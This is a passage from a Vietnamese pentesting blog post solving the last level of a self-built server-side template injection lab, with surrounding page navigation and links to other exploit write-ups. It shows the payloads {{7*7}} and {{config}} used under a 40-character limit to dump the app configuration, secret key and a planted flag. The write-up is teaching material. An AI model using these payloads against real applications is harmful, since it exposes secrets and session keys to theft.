<p>Cái lớp filter thứ 2 này tương tự như filter của level 2 ở đây thì ta hoàn toàn có thể bypass được bằng cách nối chuỗi nên ta sẽ chú ý hơn cách payload được filter độ dài payload bây giờ tôi sẽ test thử <code>&#123;&#123;7*7&#125;&#125;</code> để xem template có xử lý input không.</p>
<p><img src="https://hackmd.io/_uploads/ryTo0m9b-x.png" alt="image"></p>
<p>Okay chắc chắn nó đã xử lý rồi bây giờ ta sẽ phải tìm cách tạo payload mà phải dưới 40 characters.</p>
<p>Sau một lúc test và tham khảo thêm payload vài nơi thì mình nhận ra để có thể mà thực thi được các câu OS command thì rất khó và gần như là bất khả thi vì để thực thi thì ta sẽ phải thêm nhiều thuộc tính vào với mục đích leo thang lên từ đó có thể thực hiện câu lệnh nhưng ở đây vì giới hạn 40 kí tự nên rất khó để làm vậy nên ta chỉ có thể đi theo hướng dump ra dữ liệu quan trọng.</p>
<p><img src="https://hackmd.io/_uploads/rJD5wacW-l.png" alt="image"></p>
<p>Tại đây ta sẽ inject vào một đoạn : </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Để dump hết file config của hệ thống ra và nó leak cho ta khá nhiều thông tin quan trọng trong đó có những thứ có thể phục vụ cho leo thang đặc quyền như là <code>Secret Key</code> hoặc là <code>Session Cookie</code>.</p>
<p>Ở đây tôi tạo một file flag bí mật để xem có lấy được ra không nếu được thì kịch bản dump dữ liệu quan trọng là khả thi.</p>
<p><img src="https://hackmd.io/_uploads/r1VKg0qZWe.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SJpag09b-l.png" alt="image"></p>
<p>Thành công lấy được file flag ra và tương tự cũng lấy và đọc được file <code>SECRET_KEY</code> và kết thúc lab SSTI.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/12/01/2025-12-01-SSTI-Lab/">https://pzhat.github.io/2025/12/01/2025-12-01-SSTI-Lab/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/02/2025-12-02-iredTeam-AS-REP-Roasting/" title="IredTeam AS-REP Roasting"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">IredTeam AS-REP Roasting</div></div><div class="info-2"><div class="info-item-1">IredTeam AS-REP RoastingAS-REP là gì?AS-REP (viết tắt của Authentication Service Reply) là một thông điệp trong giao thức xác thực Kerberos. Đây là bước thứ hai trong quá trình xác thực ban đầu, được gửi từ Key Distribution Center (KDC), thường là một Domain Controller trong môi trường Active Directory, đến người dùng. Thông điệp này chứa Ticket-Granting Ticket (TGT), một ticket được mã hóa dùng để yêu cầu các vé dịch vụ khác mà không cần người dùng phải nhập lại mật khẩu. Một phần của thông ...</div></div></div></a><a class="pagination-related" href="/2025/11/25/2025-11-25-GraphQL-API-Vulnerability/" title="GraphQL API Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">GraphQL API Vulnerability</div></div><div class="info-2"><div class="info-item-1">GraphQL API Vulnerability PortSwigger ChallengeOverview về GraphQLGraphQL là một ngôn ngữ truy vấn cho API (Query Language for APIs) và cũng là một môi trường thực thi phía máy chủ (server-side runtime) để thực hiện các truy vấn đó. Để dễ hiểu hãy hình dung như sau:   Với API truyền thống (như REST API): Bạn phải gọi nhiều &quot;endpoint&quot;(đường dẫn) khác nhau để lấy các loại dữ liệu khác nhau.  Ví dụ: để lấy thông tin người dùng và các bài viết của họ, bạn có thể phải gọi &#x2F;users&#x2...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-09-09-Cookie-Arena-Cmdi/" title="Cookie Arena Challenges WU (@Phatmh)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Cookie Arena Challenges WU (@Phatmh)</div></div><div class="info-2"><div class="info-item-1">Cookie Arena Web Challenges WriteUp by (@Phatmh)NSLookup (Level 1)Đây là một Website có chức năng là nslookup sử dụng hàm shell_exec của php để thực thi. Ta tiến hành truy cập để xem giao diện của web app.Ở đây ta thấy nó khá là basic khi chỉ có duy nhất một nơi có chức năng nslookup và bên cạnh là source code cho sẵn của chall, ta sẽ tiến hành phân tích source code được cấp sẵn. Ở ngay đầu tiên ta gặp khởi tạo và include file design và tạo object ($design) có tên là NSLookup Tool. Đến với nh...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Cmdi/" title="Java Servlet Command Injection Vulnerability Challenges"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Command Injection Vulnerability Challenges</div></div><div class="info-2"><div class="info-item-1">Java Servlet Command Injection Vulnerability ChallengesCấu trúc Project Cấu trúc Project   1234567891011121314151617181920212223242526272829303132333435+---.idea+---.mvnª   +---wrapper+---srcª   +---mainª   ª   +---javaª   ª   ª   +---ciª   ª   ª       +---controllerª   ª   ª       +---serviceª   ª   ª       +---utilª   ª   +---resourcesª   ª   ª   +---META-INFª   ª   +---webappª   ª       +---WEB-INFª   +---testª       +---javaª       +---resources+---target    +---classes    ª   +---ci    ª...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-FileUpload-Servlet/" title="Java Servlet FileUpload Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet FileUpload Vulnerability</div></div><div class="info-2"><div class="info-item-1">Java Servlet FileUpload Vulnerability by @PhatmhLỗ hổng File UploadBản chất của File Upload: File Upload đối với tôi nó đơn giản chỉ là lợidụng Unsafe Method để truyền một Untrusted Data vào nhằm thay đổi hànhvi của hệ thống trong trường hợp này là Web App, với FileUpload những gìUser Upload lên sẽ chính là Untrusted Data và với Feature Upload Filenhư này sẽ thế nào nếu nó không được Validate một cách cẩn thận ta sẽđến với DEMO bằng Java Servlet. Web App OverviewĐây là một Web App được dựng v...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/" title="CyberCon 2025 SafeUpload Web Challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CyberCon 2025 SafeUpload Web Challenge</div></div><div class="info-2"><div class="info-item-1">CyberCon 2025 SafeUpload Web ChallengeTổng quan challenge Mở challenge lên thì ta thấy nó cấp cho ta một giao diện dùng để upload file nên nghi ngờ ban đầu sẽ là web này dính lỗ hổng file upload. Tiến hành thử upload lên file php với nội dung: 123&lt;?phpecho &quot;test&quot;;?&gt;   Có vẻ như đã dính filter của bài có thể thấy nó đã xoá đi file mình upload lên, bây giờ ta thử upload 1 file php nhưng không có nội dung.  Vẫn là file đó nhưng không có nội dung thì hoàn toàn có thể upload bình t...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-19-Path-Traversal-Servlet/" title="Java Servlet Path Traversal vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Path Traversal vulnerability</div></div><div class="info-2"><div class="info-item-1">Java Servlet Path Traversal vulnerabilitySource Code:[Github Link] Overview Đây là chức năng hiển thị hình ảnh của các file đã nằm trong folder images.  Ở đây ta test file skibidi.jpg và request nó sẽ hiển thị lên cho ta.  Đây là nơi chứa các file có thể hiển thị. Vì là build trên môi trường windows localhost qua apache tôi sẽ tạo một thư mục /protected có chứa file bí mật.  Tiến hành khai thác và POCLevel 1:123456789101112131415161718192021private void handleLevel1(String fileName, HttpServl...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">Pentester/Redteam</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/pzhat"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/pzhat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/phat-mai-hong-2580a52aa/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0A66C2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Blog about cybersecurity, hacking, pentesting, red teaming and more...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ServerSide-Template-Injection-SSTI-Lab"><span class="toc-number">1.</span> <span class="toc-text">ServerSide Template Injection (SSTI) Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI-la-gi"><span class="toc-number">1.1.</span> <span class="toc-text">SSTI là gì</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Co-che-hoat-dong-cua-SSTI"><span class="toc-number">1.2.</span> <span class="toc-text">Cơ chế hoạt động của SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tac-dong-cua-SSTI"><span class="toc-number">1.3.</span> <span class="toc-text">Tác động của SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cau-truc-lab-SSTI"><span class="toc-number">1.4.</span> <span class="toc-text">Cấu trúc lab SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Solving"><span class="toc-number">1.5.</span> <span class="toc-text">Lab Solving</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">Level 1:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-2"><span class="toc-number">1.5.2.</span> <span class="toc-text">Level 2:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-3"><span class="toc-number">1.5.3.</span> <span class="toc-text">Level 3:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-4"><span class="toc-number">1.5.4.</span> <span class="toc-text">Level 4:</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/14/2026-14-02-CVE-2026-0702/" title="CVE-2026-0702 WordPress VidShop Plugin &lt;= 1.1.4 is vulnerable to a high priority SQL Injection">CVE-2026-0702 WordPress VidShop Plugin &lt;= 1.1.4 is vulnerable to a high priority SQL Injection</a><time datetime="2026-02-14T09:29:23.541Z" title="Created 2026-02-14 16:29:23">2026-02-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/11/2026-11-02-CVE-2026-23550/" title="CVE-2026-23550 WordPress Modular DS Plugin &lt;= 2.5.1 is vulnerable to a high priority Privilege Escalation">CVE-2026-23550 WordPress Modular DS Plugin &lt;= 2.5.1 is vulnerable to a high priority Privilege Escalation</a><time datetime="2026-02-11T02:25:47.507Z" title="Created 2026-02-11 09:25:47">2026-02-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/03/2026-02-03-CVE-2025-13329/" title="CVE-2025-13329 File Uploader for WooCommerce">CVE-2025-13329 File Uploader for WooCommerce</a><time datetime="2026-02-03T15:56:51.995Z" title="Created 2026-02-03 22:56:51">2026-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/01/2026-02-01-CVE-2025-68519/" title="CVE-2025-68519 WordPress Brands for WooCommerce Plugin">CVE-2025-68519 WordPress Brands for WooCommerce Plugin</a><time datetime="2026-01-31T17:12:36.483Z" title="Created 2026-02-01 00:12:36">2026-02-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/27/2026-01-27-CVE-2025-14770/" title="CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter">CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter</a><time datetime="2026-01-27T14:19:14.489Z" title="Created 2026-01-27 21:19:14">2026-01-27</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>